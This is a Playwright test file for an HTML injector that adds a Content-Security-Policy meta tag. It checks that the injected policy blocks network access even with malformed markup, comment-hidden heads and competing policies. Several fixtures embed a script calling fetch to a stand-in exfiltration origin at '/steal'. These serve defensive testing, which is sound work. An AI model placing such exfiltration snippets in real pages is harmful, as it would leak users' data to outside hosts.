import { expect, test } from '../../fixtures/test-options';
import { CSP_META, injectCsp } from '../../../packages/injector/src/index.ts';
import { EXFIL_ORIGIN } from '../../support/policy';

/**
 * The injector's own output, asserted where it has to hold. TC-T03 covers a file
 * the skeleton actually published; the three cases below were the phase-0
 * placeholder's known defects and are the definition of done for task-1.5. They
 * went green when the regex was replaced with parse5.
 */

const naked = `<!doctype html>
<html lang="en"><head><title>No policy</title></head>
<body><h1>No policy</h1>
<script>fetch('${EXFIL_ORIGIN}/steal').catch(() => {});</script>
</body></html>`;

test('TC-T03: a file the injector published is refused the network from file:// @csp @safety', async ({
  openPublished,
  violations,
  reached,
}) => {
  // openPublished runs the real injector — the same function the review CLI calls.
  await openPublished(naked);

  await expect.poll(() => violations.length, { timeout: 5_000 }).toBeGreaterThanOrEqual(1);
  expect(violations.map((v) => v.directive)).toContain('connect-src');
  expect(reached).toEqual([]);
});

test.describe('defects the phase-0 placeholder had — fixed by the parse5 injector (task-1.5)', () => {
  test('TC-CSP10: malformed markup still gets an enforced policy @csp @safety', async ({
    openPublished,
    violations,
  }) => {
    // No <head>, no <html>, an unclosed tag, and a script a browser will happily
    // run. The regex injector wraps this in a fresh document rather than
    // reproducing the browser's own parse, so what ships is not what was reviewed.
    await openPublished(
      `<div><p>oops<script>fetch('${EXFIL_ORIGIN}/steal').catch(() => {});</script>`,
    );

    await expect.poll(() => violations.length).toBeGreaterThanOrEqual(1);
  });

  test('TC-CSP11: the injected meta is the first element in head @csp @safety', () => {
    // A policy that arrives after a <script> in source order does not govern it.
    const injected = injectCsp(
      `<html><head><script>fetch('${EXFIL_ORIGIN}/steal')</script><title>t</title></head><body></body></html>`,
    );
    const head = injected.slice(injected.indexOf('<head'), injected.indexOf('</head>'));

    expect(head.indexOf(CSP_META)).toBeLessThan(head.indexOf('<script'));
  });

  test('a <head> inside a comment does not divert the policy @csp @safety', () => {
    // The regex injector matched the <head> inside this comment and put the meta
    // there, where a browser never sees it — the file shipped with no policy at
    // all. A conformant parse sees one comment and a real head.
    const injected = injectCsp(
      `<!-- <head> --><script>fetch('${EXFIL_ORIGIN}/steal')</script><head>`,
    );
    const beforeMeta = injected.slice(0, injected.indexOf(CSP_META));

    expect(injected).toContain(CSP_META);
    expect(beforeMeta.lastIndexOf('<!--')).toBeLessThanOrEqual(beforeMeta.lastIndexOf('-->'));
    expect(injected.indexOf(CSP_META)).toBeLessThan(injected.indexOf('<script'));
  });

  test('TC-CSP12: a policy the tool declared for itself does not survive @csp @safety', () => {
    // Two meta CSPs intersect, so a weaker one cannot loosen ours — but one
    // declaring `connect-src *` before ours would still confuse a reviewer
    // reading the published file, and the parser must strip it.
    const injected = injectCsp(
      `<html><head><meta http-equiv="Content-Security-Policy" content="default-src *"><title>t</title></head><body></body></html>`,
    );

    expect(injected).not.toContain('default-src *');
    expect(injected).toContain(CSP_META);
  });
});
